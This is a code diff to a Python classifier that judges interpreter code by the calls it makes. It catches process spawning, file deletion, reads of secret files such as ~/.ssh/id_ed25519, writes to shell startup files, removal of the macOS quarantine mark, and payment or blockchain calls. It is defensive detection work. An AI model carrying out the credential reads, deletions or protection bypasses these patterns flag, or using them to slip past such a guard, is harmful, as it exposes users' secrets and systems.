 _PY_VAR = re.compile(r"^[ \t]*(?:const|let|var|my|our)?[ \t]*\$?([A-Za-z_][A-Za-z0-9_]*)[ \t]*=(?!=)[ \t]*([^;\n]+?)[ \t]*;?[ \t]*$", re.M)
 _RUN_API = re.compile(r"(os\.system|os\.popen|subprocess\.(?:run|call|check_call|check_output|Popen|getoutput|getstatusoutput)|child_process\.(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)|"
-                      r"(?<![\w.])(?:execSync|spawnSync|exec|spawn|system|popen|IO\.popen|Open3\.\w+|commands\.getoutput|pty\.spawn|os\.exec[lv]p?e?|os\.spawn[lv]p?e?))\s*\(")
+                      r"os\.execute|io\.popen|Bun\.spawn(?:Sync)?|os\.posix_spawnp?|"
+                      r"(?<![\w.])(?:execSync|spawnSync|execFileSync|execFile|exec|spawn|system|popen|IO\.popen|Open3\.\w+|commands\.getoutput|pty\.spawn|os\.exec[lv]p?e?|os\.spawn[lv]p?e?))\s*\(")
 _DEL_FN = {"shutil.rmtree", "os.remove", "os.unlink", "os.rmdir", "os.removedirs", "rmtree", "fs.rmSync", "fs.rm", "fs.unlinkSync", "fs.unlink", "fs.rmdirSync",
            "fs.rmdir", "fs.promises.rm", "fs.promises.unlink", "rimraf", "rimraf.sync", "FileUtils.rm_rf", "FileUtils.rm_r", "FileUtils.rm", "File.delete", "File.unlink", "unlink"}
 _READ_FN = {"fs.readFileSync", "fs.readFile", "fs.createReadStream", "fs.promises.readFile", "File.read", "IO.read", "File.binread"}
@@ -5967,6 +6232,9 @@ def _code_path(expr, pyvars, home, operands):
         return m.group(2)
     if re.fullmatch(r"(?:os\.environ(?:\[['\"]HOME['\"]\]|\.get\(['\"]HOME['\"]\))|os\.getenv\(['\"]HOME['\"]\)|process\.env\.HOME|os\.homedir\(\)|homedir\(\)|ENV\[['\"]HOME['\"]\]|Dir\.home|Path\.home\(\)|pathlib\.Path\.home\(\))", e):
         return home
+    m = re.fullmatch(r"glob\s*\(\s*(['\"])(~/[^*?\[{]*)\1\s*\)|(\")\$ENV\{HOME\}(/[^\"$@]*)\"", e)    # r0319: perl glob("~/x"), "$ENV{HOME}/x"
+    if m:
+        return home + (m.group(2)[1:] if m.group(2) else m.group(4))
     m = re.fullmatch(r"(?:os\.path\.expanduser|expanduser|path\.expanduser)\s*\(\s*(['\"])((?:(?!\1).)*)\1\s*\)", e)
     if m:
         v = m.group(2)
@@ -6024,6 +6292,93 @@ def _split_plus(e):
     return [x.strip() for x in out]
 
 
+# r0319 (RT 15.11 Б3): the forms of the same call the lexical scan did not know. Law: what code DOES does not depend on how it names the
+# module or the path -- `import subprocess as s; s.run([...])` is subprocess.run, `require('child_process').execSync(x)` is
+# child_process.execSync, `(Path.home()/'.ssh'/'id_ed25519').read_text()` reads ~/.ssh/id_ed25519, perl `open F, ">>", glob("~/.zshrc")`
+# writes ~/.zshrc. Each is rewritten to the form the scan below already judges (a path it cannot show stays "not shown": opaque).
+_PATH_LIT = r"(['\"])((?:(?!\{q}).)*)\{q}"
+_HOME_CHAIN = re.compile(r"(?:pathlib\.)?Path\.home\(\)((?:\s*/\s*(['\"])[^'\"\n]*\2|\s*\.joinpath\(\s*(?:(['\"])[^'\"\n]*\3\s*,?\s*)+\))*)")
+_PATH_METHOD = re.compile(r"\.\s*(?:read_text|read_bytes|write_text|write_bytes|touch|unlink|rmdir|rename|replace|chmod|symlink_to|"
+                          r"hardlink_to|open)\s*\(")
+_CODE_HOMEISH = re.compile(r"Path\.home|expanduser|homedir|\$ENV\{HOME\}|ENV\[['\"]HOME|getenv\(['\"]HOME|environ\[['\"]HOME|['\"]~/")
+
+
+def _home_chain_path(m, home):
+    parts = re.findall(r"(['\"])([^'\"\n]*)\1", m.group(1) or "")
+    return "/".join([home.rstrip("/")] + [x[1].strip("/") for x in parts if x[1].strip("/")])
+
+
+def _code_canon(code, home, who):
+    if not isinstance(code, str):
+        return code
+    try:
+        for mod in ("subprocess", "os", "shutil", "pathlib", "stripe"):
+            for m in re.finditer(r"\bimport\s+%s\s+as\s+([A-Za-z_]\w*)" % mod, code):
+                code = re.sub(r"(?<![\w.])%s\." % re.escape(m.group(1)), mod + ".", code)
+            for m in re.finditer(r"\bfrom\s+%s\s+import\s+\(?([\w\s,]+)\)?" % mod, code):
+                for nm in m.group(1).split(","):
+                    bits = nm.split()
+                    if not bits:
+                        continue
+                    orig, al = bits[0], (bits[2] if len(bits) == 3 and bits[1] == "as" else bits[0])
+                    if re.fullmatch(r"[A-Za-z_]\w*", al) and orig not in ("*",):
+                        code = re.sub(r"(?<![\w.])%s\s*(?=[(.])" % re.escape(al), "%s.%s" % (mod, orig), code)
+        code = re.sub(r"require\s*\(\s*['\"](?:node:)?child_process['\"]\s*\)", "child_process", code)
+        code = re.sub(r"\bimport\s+\*\s+as\s+(\w+)\s+from\s+['\"](?:node:)?child_process['\"]", r"\1 = child_process", code)
+        for m in re.finditer(r"([A-Za-z_$][\w$]*)\s*=\s*child_process\b(?!\.)", code):
+            code = re.sub(r"(?<![\w.$])%s\." % re.escape(m.group(1)), "child_process.", code)
+        code = re.sub(r"(?<![\w.])pathlib\.Path\s*\(", "Path(", code)
+        if isinstance(home, str) and home.startswith("/") and "home()" in code:
+            q = lambda m: "Path(%r)" % _home_chain_path(m, home)                      # noqa: E731
+            code = re.sub(r"(?<![\w)\]])\(\s*" + _HOME_CHAIN.pattern + r"\s*\)", q, code)
+            code = _HOME_CHAIN.sub(q, code)
+        code = re.sub(r"Path\(\s*(['\"])(~[^'\"\n]*)\1\s*\)\s*\.\s*expanduser\(\s*\)", lambda m: "Path(%r)" % m.group(2), code)
+        if isinstance(who, str) and who.rsplit("/", 1)[-1].startswith("perl"):
+            # perl's open without parentheses: 3-argument `open F, ">>", EXPR` and 2-argument `open F, ">>PATH"` -> open(EXPR, "a")
+            def _p3(m):
+                md = m.group(3)
+                return "open(%s, %r)" % (m.group("e").strip(), "a" if ">>" in md else "w" if ">" in md else "r")
+            code = re.sub(r"\bopen\s*(?P<par>\()?\s*(?:my\s+)?[$\w]+\s*,\s*(['\"])(\+?[<>]{1,2}|\+<|<)\2\s*,\s*(?P<e>[^;]+?)\s*(?(par)\))\s*(?=;|or\b|\|\||$)",
+                          _p3, code)
+            code = re.sub(r"\bopen\s*\(?\s*(?:my\s+)?[$\w]+\s*,\s*(['\"])(>>|>|\+<|<)\s*([^'\"]+)\1\s*\)?",
+                          lambda m: "open(%r, %r)" % (m.group(3).strip(), "a" if m.group(2) == ">>" else "w" if ">" in m.group(2) else "r"), code)
+    except (re.error, RecursionError):                 # noqa: PERF203 -- the code as it was: judged as before
+        return code
+    return code
+
+
+_CODE_DEFENSE = re.compile(r"(?:removexattr|xattr\.remove|xattr\.delete|xattr\.removexattr)\s*\([^)]*com\.apple\.(?:quarantine|provenance)", re.I)
+_CODE_MONEY = re.compile(
+    r"\bstripe\.(?:Charge|PaymentIntent|Payout|Transfer|Refund|Invoice|Subscription|Topup|PaymentLink|checkout\.Session)\.(?:create|confirm|capture|pay)\b|"
+    r"\.(?:charges|paymentIntents|payment_intents|payouts|transfers|refunds|topups|paymentLinks|payment_links|checkout\.sessions)"
+    r"\.(?:create|confirm|capture|pay)\s*\(|"
+    r"\.(?:send_transaction|send_raw_transaction|sendTransaction|sendRawTransaction|transact)\s*\(|['\"]eth_send(?:Raw)?Transaction['\"]")
+
+
+def _code_acts(code, c, who):
+    """r0319: the acts of code judged by the API it calls, not by a program name: Н10 (the quarantine mark removed through the xattr
+    API) and money (a payment SDK's create / confirm / capture; a blockchain transaction sent). A payment call of an unrelated object
+    (`self.transfers.create(`) needs the SDK named in the same code."""
+    if not isinstance(code, str):
+        return
+    m = _CODE_DEFENSE.search(code)
+    if m:
+        c.add(DEFENSE, "%s code removes the quarantine mark: %s" % (who, m.group(0)[:80]))
+    elif re.search(r"com\.apple\.(?:quarantine|provenance)", code) and re.search(r"\bxattr\b", code, re.I) and \
+            re.search(r"\.\s*(?:remove|delete|removexattr|__delitem__)\s*\(|\bdel\s+\w", code):
+        # r0323 (RT 15.11 Б3): `xattr.xattr('tool').remove('com.apple.quarantine')`, `x = xattr.xattr(f); x.remove(...)`: the API, not the shape
+        c.add(DEFENSE, "%s code removes the quarantine mark (xattr)" % who)
+    m = _CODE_MONEY.search(code)
+    if m and (m.group(0).startswith("stripe.") or re.search(r"\b(stripe|Stripe|web3|Web3|ethers|viem|solana|braintree|paypal|squareup|adyen)\b", code)):
+        c.add(MONEY, "%s code: %s" % (who, m.group(0)[:80].strip(".(")))
+    elif re.search(r"\b(?:import|require)\b[^\n;]*\b(stripe|braintree|paypalrestsdk|squareup|adyen)\b", code):
+        # r0323 (RT 15.11 Б3): a payment SDK imported and a payment object of it reached through a name (`C = stripe.Charge; C.create(`,
+        # `gw.transaction.sale(`): the SDK's money verbs on any receiver
+        m2 = re.search(r"\.\s*(create|confirm|capture|pay|sale|submit_for_settlement)\s*\(", code)
+        if m2 and re.search(r"\b(?:Charge|PaymentIntent|Payout|Transfer|Refund|Invoice|Subscription|Topup|PaymentLink|Payment|transaction|Order)\b", code):
+            c.add(MONEY, "%s code: a payment through the SDK (%s)" % (who, m2.group(1)))
+
+
 def _code_fs_scan(code, c, who, cwd, home, project, depth, operands=()):
     """0.2.90 ("consequences, not commands"): the file system calls of interpreter code, judged by the path each names. A deletion:
     outside the project -> rm-rf (G1), inside -> a write of the mandate's targets; a write: judged like a shell redirection (secrets,
@@ -6048,11 +6403,15 @@ def _code_fs_scan1(code, c, who, cwd, home, project, depth, operands=()):
         c.add("opaque", "%s code of %d characters" % (who, len(code)))
         return
     code = re.sub(r"require\s*\(\s*['\"](?:node:)?fs(?:/promises)?['\"]\s*\)", "fs", code)     # require('fs').rmSync(...) -> fs.rmSync(...)
+    homeish = bool(_CODE_HOMEISH.search(code))
+    code = _code_canon(code, home, who)            # r0319 (RT 15.11 Б3): aliases, require('child_process'), Path.home() chains, perl open
+    _code_acts(code, c, who)                       # r0319 (RT 15.11 Б3/Б4): an OS protection switched off, a payment, by API
     pyvars = {}
     for m in _PY_VAR.finditer(re.sub(r";[ \t]*(?=[A-Za-z_$])", "\n", code)):          # `import sys;p=sys.argv[1];s=...`: one statement per line
         pyvars[m.group(1)] = None if m.group(1) in pyvars else m.group(2)      # the right-hand side, read by _code_path when used
     pyvars = {k: v for k, v in pyvars.items() if isinstance(v, str)}
     ops = list(operands)
+    n_path = 0                                          # r0319: Path(...) calls with a method this scan judged (see below)
     for m in _FS_API.finditer(code):
         fn = m.group("fn")
         expr, a_end = _arg_expr(code, m.end())
@@ -6086,6 +6445,7 @@ def _code_fs_scan1(code, c, who, cwd, home, project, depth, operands=()):
         if kind is None:
             continue
         path = _code_path(expr, pyvars, home, ops)
+        n_path += fn == "Path"
         if path is None:
             if kind == "delete":
                 c.add("opaque", "%s code: %s with a path not shown (%s)" % (who, fn, expr[:40]))
@@ -6109,15 +6469,107 @@ def _code_fs_scan1(code, c, who, cwd, home, project, depth, operands=()):
             p_ = _abspath(path, cwd, home)
             if is_secret_path(path) or is_secret_path(p_):
                 c.add("secrets", p_)
+    if homeish and len(_PATH_METHOD.findall(code)) > n_path:
+        # r0319 (Б3): code that names the home folder and calls a file method on a path object this scan did not follow
+        # (`h = Path.home(); (h/'.ssh'/'id_ed25519').read_text()`): the path is not shown -> asked, never silent
+        c.add("opaque", "%s code: a file call on a home-folder path not shown" % who)
+    _code_runs(code, c, who, cwd, home, project, depth)
+
+
+_LIT_STR = re.compile(r"[rRbBuU]?(['\"])((?:(?!\1)[^\\]|\\.)*)\1", re.S)
+_ARGV_STYLE = re.compile(r"^(?:os\.exec[lv]p?e?|os\.spawn[lv]p?e?|os\.posix_spawnp?|Bun\.spawn(?:Sync)?)$")
+_PROG_ARGS = re.compile(r"^(?:child_process\.(?:spawn|spawnSync|execFile|execFileSync)|spawn|spawnSync|execFile|execFileSync|system|exec)$")
+# swift / Foundation: `let p = Process(); p.launchPath = "/usr/bin/git"; p.arguments = ["push", "-f"]; p.launch()`
+_SWIFT_PROC = re.compile(r"\b(?:Process|NSTask)\s*\(\s*\)")
+
+
+def _call_args(code, k):
+    """r0323: every argument expression of the call whose "(" is at code[k-1] -> [text, ...] (None: not closed)."""
+    out, i = [], k
+    while True:
+        expr, end = _arg_expr(code, i)
+        if expr is None:
+            return None
+        if expr:
+            out.append(expr)
+        if end >= len(code) or code[end] == ")":
+            return out
+        i = end + 1
+
+
+def _lit_words(expr):
+    """-> [word] of a string literal or a list / array literal of string literals; None when any part is not a literal."""
+    e = (expr or "").strip()
+    m = _LIT_STR.fullmatch(e)
+    if m:
+        return [m.group(2)]
+    if e[:1] == "[" and e[-1:] == "]":
+        inner = e[1:-1].strip().rstrip(",")
+        if not inner:
+            return []
+        parts = [x.strip() for x in re.split(r",(?=(?:[^'\"]*(['\"])[^'\"]*\1)*[^'\"]*$)", inner) if x and x.strip() and x not in ("'", '"')]
+        ws = [_LIT_STR.fullmatch(x) for x in parts]
+        return [w.group(2) for w in ws] if all(ws) else None
+    return None
+
+
+def _code_runs(code, c, who, cwd, home, project, depth):
+    """r0323 (закон (2), RT 15.11 Б3): every program interpreter code starts is a command line of its own when the code shows ALL of it
+    (a shell string; a program and its argument list: `os.execvp('git', ['git', 'push', '-f'])`, `spawnSync('git', ['push'])`,
+    `system("git", "push", "-f")`, `Bun.spawnSync(['git', ...])`, swift Process with launchPath + arguments); a program whose name or
+    arguments the code builds at run time is the danger opaque -- asked, never silent. Before r0323 only the FIRST argument was read:
+    `execvp('git', [... 'push', '-f'])` was a plain `git`, and `spawnSync('git', a)` with `a` a variable too."""
     for m in _RUN_API.finditer(code):
-        expr, _ = _arg_expr(code, m.end())
-        lit = re.fullmatch(r"[rRbBuUf]?(['\"])((?:(?!\1).)*)\1", expr or "")
-        if lit and not expr.startswith("f"):
-            _merge(c, classify(lit.group(2), cwd, home, depth + 1, project, _budget=c.budget))
+        fn = re.sub(r"\s+", "", m.group(1))
+        args = _call_args(code, m.end())
+        if not args:
+            c.add("opaque", "%s code runs a command not shown (%s)" % (who, fn[:40]))
             continue
-        if expr is not None and expr.startswith("["):
-            words = re.findall(r"(['\"])((?:(?!\1).)*)\1", expr)
-            if words and len(words) == len([x for x in expr.strip("[]").split(",") if x.strip()]):
-                _merge(c, classify(" ".join(shlex.quote(w[1]) for w in words), cwd, home, depth + 1, project, _budget=c.budget))
+        words = None
+        if _ARGV_STYLE.match(fn):
+            a_ = args[1:] if fn.startswith("os.spawn") else args             # os.spawnv(mode, file, args)
+            if fn.startswith("Bun."):
+                words = _lit_words(a_[0]) if a_ else None
+            elif a_:
+                f_ = _lit_words(a_[0])
+                if fn.startswith("os.posix_spawn") or re.match(r"os\.(?:exec|spawn)v", fn):
+                    rest = _lit_words(a_[1]) if len(a_) > 1 else []
+                    words = f_ + rest[1:] if f_ is not None and len(f_) == 1 and rest is not None else None
+                else:                                                        # os.execlp(file, arg0, arg1, ...)
+                    ls_ = [_lit_words(x) for x in a_[2:] if not re.match(r"(?:os\.)?environ\b|env\b", x.strip())]
+                    words = f_ + [w for x in ls_ for w in x] if f_ is not None and len(f_) == 1 and all(x is not None and len(x) == 1 for x in ls_) else None
+                if words is None and f_ is not None and len(f_) == 1:
+                    _merge(c, classify(shlex.quote(f_[0]), cwd, home, depth + 1, project, _budget=c.budget))
+                    c.add("opaque", "%s code runs %s with arguments not shown" % (who, f_[0][:40]))
+                    continue
+        elif _PROG_ARGS.match(fn) and len(args) > 1 and _lit_words(args[0]) is not None and len(_lit_words(args[0])) == 1:
+            ws_ = [_lit_words(x) for x in args[1:] if not (x.strip().startswith("{") or re.match(r"(?:encoding|shell|cwd|env|stdio|check|text|capture_output)\s*[=:]", x.strip()))]
+            prog = _lit_words(args[0])[0]
+            if all(x is not None for x in ws_):
+                words = [prog] + [w for x in ws_ for w in x]
+            else:
+                _merge(c, classify(shlex.quote(prog), cwd, home, depth + 1, project, _budget=c.budget))
+                c.add("opaque", "%s code runs %s with arguments not shown" % (who, prog[:40]))
                 continue
-        c.add("opaque", "%s code runs a command not shown (%s)" % (who, (expr or "")[:40]))
+        else:
+            expr = args[0]
+            lit = re.fullmatch(r"[rRbBuUf]?(['\"])((?:(?!\1).)*)\1", expr or "")
+            if lit and not expr.startswith("f"):
+                _merge(c, classify(lit.group(2), cwd, home, depth + 1, project, _budget=c.budget))
+                continue
+            words = _lit_words(expr) if expr.startswith("[") else None
+            if words == []:
+                words = None
+        if words:
+            _merge(c, classify(" ".join(shlex.quote(w) for w in words), cwd, home, depth + 1, project, _budget=c.budget))
+            continue
+        c.add("opaque", "%s code runs a command not shown (%s)" % (who, (args[0] if args else fn)[:40]))
+    if _SWIFT_PROC.search(code):
+        lp = re.search(r"\.(?:launchPath|executableURL)\s*=\s*(?:URL\s*\(\s*fileURLWithPath\s*:\s*)?(\"[^\"]*\")", code)
+        ag = re.search(r"\.arguments\s*=\s*(\[[^\]]*\])", code)
+        pw = _lit_words(lp.group(1)) if lp else None
+        aw = _lit_words(ag.group(1)) if ag else ([] if lp and not re.search(r"\.arguments\b", code) else None)
+        if pw and aw is not None:
+            _merge(c, classify(" ".join(shlex.quote(w) for w in pw + aw), cwd, home, depth + 1, project, _budget=c.budget))
+        else:
+            c.add("opaque", "%s code starts a process not shown (Process)" % who)
